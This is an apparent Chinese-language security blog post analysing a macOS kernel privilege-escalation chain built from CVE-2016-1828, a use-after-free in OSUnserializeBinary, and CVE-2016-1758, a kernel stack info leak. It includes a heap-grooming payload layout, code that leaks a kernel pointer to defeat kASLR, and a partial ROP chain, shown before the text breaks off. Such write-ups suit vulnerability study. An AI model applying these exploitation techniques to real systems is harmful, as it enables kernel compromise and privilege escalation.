<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta property="og:type" content="website">
<meta property="og:title" content="buffer0verflooow - Blog">
<meta property="og:url" content="https://buffer0verflooow.github.io/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="buffer0verflooow">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://buffer0verflooow.github.io/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">buffer0verflooow - Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2024/11/03/Apple%20%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/11/03/Apple%20%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Apple 序列化漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-11-03 22:49:00 / Modified: 22:51:17" itemprop="dateCreated datePublished" datetime="2024-11-03T22:49:00+08:00">2024-11-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CVE-2016-1828"><a href="#CVE-2016-1828" class="headerlink" title="CVE-2016-1828"></a>CVE-2016-1828</h1><p>UAF 提权漏洞。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>10.11.4</p>
<h2 id="发现过程"><a href="#发现过程" class="headerlink" title="发现过程"></a>发现过程</h2><p>看内核代码时发现的</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1828">CVE-2016-1828</a>：<code>是OSUnserializeBinary</code>函数中的一个UAF，通过给这个函数传递一个恶意的二进制blob，将导致该函数调用一个对象的虚函数，这个虚函数指针是被控制的。作者是利用这个漏洞实现了NULL指针解引用。</p>
<p><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1758">CVE-2016-1758</a>：是 <code>if_clone_list</code>函数中的一个内核栈信息泄露，一个8字节的未初始化的内核栈信息被复制到用户空间中。这些字节可以在触发漏洞之前，通过syscall调用初始化为内核text地址。获取到泄漏的text指针后，通过减掉已知的text地址，可以计算出kernel slide。</p>
<h2 id="OSUnserializeBinary"><a href="#OSUnserializeBinary" class="headerlink" title="OSUnserializeBinary"></a><code>OSUnserializeBinary</code></h2><p>当用户空间与内核空间，需要传递一些数据，如字符串、数组、字典等。Libkern 通过定义容器和集合类，与传递给用户空间 API 的 CoreFoundation 对象相对应，使数据交换变得简单。这些类都继承自OSObject，在下面的表格中列出。</p>
<table>
<thead>
<tr>
<th>XML tag</th>
<th>CoreFoundation class</th>
<th>Libkern class</th>
<th>Contents</th>
</tr>
</thead>
<tbody><tr>
<td><code>true</code> or <code>false</code></td>
<td><code>CFBoolean</code></td>
<td><code>OSBoolean</code></td>
<td>Boolean <code>true</code> or <code>false</code></td>
</tr>
<tr>
<td><code>data</code></td>
<td><code>CFData</code></td>
<td><code>OSData</code></td>
<td>Array of bytes</td>
</tr>
<tr>
<td><code>integer</code></td>
<td><code>CFNumber</code></td>
<td><code>OSNumber</code></td>
<td>Integer value</td>
</tr>
<tr>
<td><code>string</code></td>
<td><code>CFString</code></td>
<td><code>OSString</code></td>
<td>Array of characters</td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>OSSymbol</code></td>
<td>Reference to unique string</td>
</tr>
<tr>
<td><code>array</code></td>
<td><code>CFArray</code></td>
<td><code>OSArray</code></td>
<td>Array of objects</td>
</tr>
<tr>
<td><code>dict</code></td>
<td><code>CFDictionary</code></td>
<td><code>OSDictionary</code></td>
<td>Map of strings to objects</td>
</tr>
<tr>
<td><code>set</code></td>
<td><code>CFSet</code></td>
<td><code>OSSet</code></td>
<td>Set of unique objects</td>
</tr>
</tbody></table>
<p>当一个CoreFoundation对象传递给内核空间时，首先通过 <code>IOCFSerialize</code>转化为二进制或XML形式。序列化的数据被传递进内核，并通过 <code>OSUnserializeXML</code>进行反序列化。如果数据是二进制的，<code>OSUnserializeXML</code>将调用 <code>OSUnserializeBinary </code>函数。</p>
<p><a target="_blank" rel="noopener" href="http://opensource.apple.com/source/xnu/xnu-3248.20.55/libkern/c++/OSSerializeBinary.cpp">OSUnserializeBinary</a>函数尝试解码和重建数据。通常，反序列化的对象包含若干个entry。当一个对象在数据中被包含了几次，为了减小序列化后的大小，二进制序列化方式支持通过下标引用之前的序列化对象。因此，反序列化的逻辑是将重建的对象被存储在一个数组中，方便后续通过下标进行引用。</p>
<p>大概是出于效率考虑，这个数组并不是像OSArray一样进行自动管理，取而代之的是，<code>OSUnserializeBinary</code>手动管理一个动态分配的OSObject数组指针。当一个新的对象被反序列化后，它被添加到 <code>objsArray</code>数组的末尾，而没有增加它的引用计数。这应该是安全的，因为每一个生成的对象被存储在其父节点中，父节点增加其引用以使其保持存活。</p>
<p>当一个节点在反序列化过程中，被通过下标进行引用时，对象指针将在objsArray中进行查找，存储在变量o中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> kOSSerializeObject:</span><br><span class="line">    <span class="keyword">if</span> (len &gt;= objsIdx) <span class="keyword">break</span>;</span><br><span class="line">    o = objsArray[len];</span><br><span class="line">    o-&gt;retain();</span><br><span class="line">    isRef = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>o在被插入到父集合中后就会删除：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (o != dict) ok = dict-&gt;setObject(sym, o);</span><br><span class="line">o-&gt;release();</span><br><span class="line">sym-&gt;release();</span><br><span class="line">sym = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>可惜的是，这种想法其实不一定很安全，因为存储的对象在反序列化的过程中可能被释放，成了一个悬空指针。</p>
<p>对于一个序列化的字典，其中的键可能被赋值好几次：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span>                          <span class="comment">&lt;!--  object 0  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>a<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                <span class="comment">&lt;!--  object 1  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span>        <span class="comment">&lt;!--  object 2  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>a<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                <span class="comment">&lt;!--  object 3  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>bar<span class="tag">&lt;/<span class="name">string</span>&gt;</span>        <span class="comment">&lt;!--  object 4  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>b<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                <span class="comment">&lt;!--  object 5  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span>&gt;</span>2<span class="tag">&lt;/<span class="name">object</span>&gt;</span>          <span class="comment">&lt;!--  object 6  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当bar被反序列化出来时，它会去替换foo，foo的引用计数就要被释放一个，这将导致在 <code>objsArray[2]</code>处出现一个悬空指针。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>控制已释放的内存中的内容，通过我们控制的虚指针调用retain函数。</p>
<ul>
<li>我们可以控制在序列化的过程中，对象何时分配、何时释放；</li>
<li>我们可以控制内存中的内容，通过在字典中添加一个OSData对象。</li>
</ul>
<p>要想控制对象的虚指针，我们需要确保已释放的对象内存被用来分配OSData对象数据缓冲区，而不是OSData对象本身。但是，OSData对象在它的数据缓冲区之前被分配，所以，我们将创建两个OSData对象，第一个被用来重新分配OSData对象，第二个则包含假的虚指针。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span>                              <span class="comment">&lt;!--   0: dict                                    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>a<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                    <span class="comment">&lt;!--   1: key &quot;a&quot;                                 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">integer</span>&gt;</span>10<span class="tag">&lt;/<span class="name">integer</span>&gt;</span>           <span class="comment">&lt;!--   2: allocate block1                         --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>b<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                    <span class="comment">&lt;!--   3: key &quot;b&quot;                                 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">integer</span>&gt;</span>20<span class="tag">&lt;/<span class="name">integer</span>&gt;</span>           <span class="comment">&lt;!--   4: allocate block2                         --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>a<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                    <span class="comment">&lt;!--   5: key &quot;a&quot;                                 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span>                         <span class="comment">&lt;!--   6: free block1; free list: block1          --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>b<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                    <span class="comment">&lt;!--   7: key &quot;b&quot;                                 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span>                         <span class="comment">&lt;!--   8: free block2; free list: block2, block1  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>a<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                    <span class="comment">&lt;!--   9: key &quot;a&quot;                                 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span>&gt;</span> vtable pointer <span class="tag">&lt;/<span class="name">data</span>&gt;</span>   <span class="comment">&lt;!--  10: OSData gets block2, data gets block1    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>b<span class="tag">&lt;/<span class="name">key</span>&gt;</span>                    <span class="comment">&lt;!--  11: key &quot;b&quot;                                 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span>&gt;</span>2<span class="tag">&lt;/<span class="name">object</span>&gt;</span>              <span class="comment">&lt;!--  12: block1-&gt;retain()                        --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>a和b均为 <code>OSNumber</code>类型，因为在64位系统上，其 <code>OSNumber</code>的大小和 <code>OSData</code>接近，可以共享一个freelist。然后将aheb赋值为true，将触发释放 <code>OSNumber</code>。在这种情况下，b的 <code>OSNumber</code>在free list的头部，a的 <code>OSNumber</code>紧接其后。通过插入一个OSData对象，可以导致，OSData的容器使用b的 <code>OSNumber</code>，OSData的数据缓冲区使用a的 <code>OSNumber</code>。通过下标引用a的OSNumber将导致在已释放的 <code>OSNumber</code>对象上调用retain函数，该虚函数指针已被覆盖为我们控制的地址，从而导致代码执行。</p>
<p>反汇编看看retain函数调用附近的虚表布局：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ffffff800088016a        cmp    eax, 0xc000000                   ;; case kOSSerializeObject</span><br><span class="line">ffffff800088016f        jne    0xffffff8000880819</span><br><span class="line">ffffff8000880175        mov    qword ptr [rbp - 0x40], rdi</span><br><span class="line">ffffff8000880179        mov    rax, qword ptr [rbp - 0x58]</span><br><span class="line">ffffff800088017d        cmp    r12d, eax                        ;;   if (len &gt;= objsIdx) break;</span><br><span class="line">ffffff8000880180        jae    0xffffff8000880819</span><br><span class="line">ffffff8000880186        mov    dword ptr [rbp - 0x4c], edx</span><br><span class="line">ffffff8000880189        mov    eax, r12d</span><br><span class="line">ffffff800088018c        mov    rcx, qword ptr [rbp - 0x60]</span><br><span class="line">ffffff8000880190        mov    r14, qword ptr [rcx + 8*rax]     ;;   o = objsArray[len]</span><br><span class="line">ffffff8000880194        mov    rax, qword ptr [r14]</span><br><span class="line">ffffff8000880197        mov    rdi, r14</span><br><span class="line">ffffff800088019a        call   qword ptr [rax + 0x20]           ;;   o-&gt;retain()</span><br></pre></td></tr></table></figure>

<p>从 <code>ffffff8000880194</code>的r14（变量o）中读出8个字节给rax，rax是虚指针。下面，<code>rax + 0x20</code>被调用，此时rip在虚指针偏移4处，rax指向虚指针的起始位置。</p>
<h2 id="SMEP和SMAP"><a href="#SMEP和SMAP" class="headerlink" title="SMEP和SMAP"></a>SMEP和SMAP</h2><ul>
<li>SMEP将导致CPU产生一个页错误，当内核试图在用户空间执行代码时。<ul>
<li>使用内核ROP进行绕过。</li>
</ul>
</li>
<li>SMAP拓展了SMEP，当内核试图访问用户空间内存时就会产生页错误。<ul>
<li>SMAP在Intel处理器的Broadwell中引入，绕过需要完全的内核ROP和虚指针。</li>
</ul>
</li>
</ul>
<h2 id="内核随机基址-kASLR"><a href="#内核随机基址-kASLR" class="headerlink" title="内核随机基址(kASLR)"></a>内核随机基址(kASLR)</h2><p>内核文件在 <code>/System/Library/Kernels/kernel</code> 中。</p>
<h2 id="信息泄露-if-clone-list"><a href="#信息泄露-if-clone-list" class="headerlink" title="信息泄露 if_clone_list"></a>信息泄露 <code>if_clone_list</code></h2><p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">if_clone_list</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> *ret_total, <span class="type">user_addr_t</span> dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> outbuf[IFNAMSIZ];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">if_clone</span> *<span class="title">ifc</span>;</span></span><br><span class="line">    <span class="type">int</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *ret_total = if_cloners_count;</span><br><span class="line">    <span class="keyword">if</span> (dst == USER_ADDR_NULL) &#123;</span><br><span class="line">        <span class="comment">/* Just asking how many there are. */</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (EINVAL);</span><br><span class="line"></span><br><span class="line">    count = (if_cloners_count &lt; count) ? if_cloners_count : count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ifc = LIST_FIRST(&amp;if_cloners); ifc != <span class="literal">NULL</span> &amp;&amp; count != <span class="number">0</span>;</span><br><span class="line">         ifc = LIST_NEXT(ifc, ifc_list), count--, dst += IFNAMSIZ) &#123;</span><br><span class="line">        strlcpy(outbuf, ifc-&gt;ifc_name, IFNAMSIZ);</span><br><span class="line">        error = copyout(outbuf, dst, IFNAMSIZ);</span><br><span class="line">        <span class="keyword">if</span> (error)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数用于将network interface cloner的名称拷贝到用户空间中。<code>ifc_name</code>比outbuf小时，outbuf中会留下一些字节没有被赋值，或者说是未初始化。但是copyout会将整个outbuf都拷贝到用户空间，也就是说包含未初始化的字节。</p>
<p>IFNAMSIZ被定义为16，一般来讲，很难保证留出8字节的未初始化空间，但是，很巧的是，第一个interface cloner是bridge，将留出9个字节。</p>
<p>看源码，找调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">soo_ioctl</span><br><span class="line">  soioctl</span><br><span class="line">    ifioctllocked</span><br><span class="line">      ifioctl</span><br><span class="line">        ifioctl_ifclone</span><br><span class="line">          if_clone_list</span><br></pre></td></tr></table></figure>

<p>soo_ioctl的定义在<a target="_blank" rel="noopener" href="http://www.opensource.apple.com/source/xnu/xnu-3248.20.55/bsd/kern/sys_socket.c"><code>socketops</code></a>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fileops</span> <span class="title">socketops</span> =</span> &#123;</span><br><span class="line">    DTYPE_SOCKET,</span><br><span class="line">    soo_read,</span><br><span class="line">    soo_write,</span><br><span class="line">    soo_ioctl,</span><br><span class="line">    soo_select,</span><br><span class="line">    soo_close,</span><br><span class="line">    soo_kqfilter,</span><br><span class="line">    soo_drain</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>看ifioctl的源码，找调用的ioctl：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">ifioctl</span><span class="params">(<span class="keyword">struct</span> socket *so, u_long cmd, <span class="type">caddr_t</span> data, <span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> OSIOCGIFCONF32:            <span class="comment">/* struct ifconf32 */</span></span><br><span class="line">    <span class="keyword">case</span> SIOCGIFCONF32:             <span class="comment">/* struct ifconf32 */</span></span><br><span class="line">    <span class="keyword">case</span> SIOCGIFCONF64:             <span class="comment">/* struct ifconf64 */</span></span><br><span class="line">    <span class="keyword">case</span> OSIOCGIFCONF64:            <span class="comment">/* struct ifconf64 */</span></span><br><span class="line">        error = ifioctl_ifconf(cmd, data);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SIOCIFGCLONERS32:          <span class="comment">/* struct if_clonereq32 */</span></span><br><span class="line">    <span class="keyword">case</span> SIOCIFGCLONERS64:          <span class="comment">/* struct if_clonereq64 */</span></span><br><span class="line">        error = ifioctl_ifclone(cmd, data);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的源码，可以找到SIOCIFGCLONERS命令，该命令结合一个结构体if_clonereq就可以了。</p>
<p>通过下面的代码，获取内核信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="type">char</span> buffer[IFNAMSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">if_clonereq</span> <span class="title">ifcr</span> =</span> &#123;</span><br><span class="line">    .ifcr_count  = <span class="number">1</span>,</span><br><span class="line">    .ifcr_buffer = buffer,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> err = ioctl(sockfd, SIOCIFGCLONERS, &amp;ifcr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%016llx\n&quot;</span>, *(<span class="type">uint64_t</span> *)(buffer + <span class="number">8</span>));</span><br></pre></td></tr></table></figure>

<p>如果幸运的话，泄漏的地址类似0xffffff801873487f这种，低21位（0x3487f）是对的。使用otool查找内核，发现一条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ledger_credit+95:</span><br><span class="line">ffffff800033487f        mov    eax, r14d</span><br></pre></td></tr></table></figure>

<p>两者相减，就能得到内核偏移。</p>
<h2 id="构建ROP"><a href="#构建ROP" class="headerlink" title="构建ROP"></a>构建ROP</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>在内核镜像中查找ROP。这里 <code>current_proc</code>等都是函数，ret到函数上，没什么问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> * vtable = (<span class="type">uint64_t</span> *)payload_addr;</span><br><span class="line"><span class="type">uint64_t</span> * rop_stack = ((<span class="type">uint64_t</span> *)(payload_addr + size)) - <span class="number">8</span>;</span><br><span class="line"><span class="comment">/* Virtual method 4 is called in the kernel with rax set to 0. */</span></span><br><span class="line">vtable[<span class="number">0</span>] = (<span class="type">uint64_t</span>)rop_stack;        <span class="comment">/*  *0 = rop_stack                  */</span></span><br><span class="line">vtable[<span class="number">4</span>] = xchg_esp_eax_pop_rsp;       <span class="comment">/*  rsp = 0; rsp = *rsp; start rop  */</span></span><br><span class="line">rop_stack[<span class="number">0</span>] = current_proc;            <span class="comment">/*  rax = &amp;proc                     */</span></span><br><span class="line">rop_stack[<span class="number">1</span>] = xchg_rax_rdi;            <span class="comment">/*  rdi = &amp;proc                     */</span></span><br><span class="line">rop_stack[<span class="number">2</span>] = proc_ucred;              <span class="comment">/*  rax = &amp;cred                     */</span></span><br><span class="line">rop_stack[<span class="number">3</span>] = xchg_rax_rdi;            <span class="comment">/*  rdi = &amp;cred                     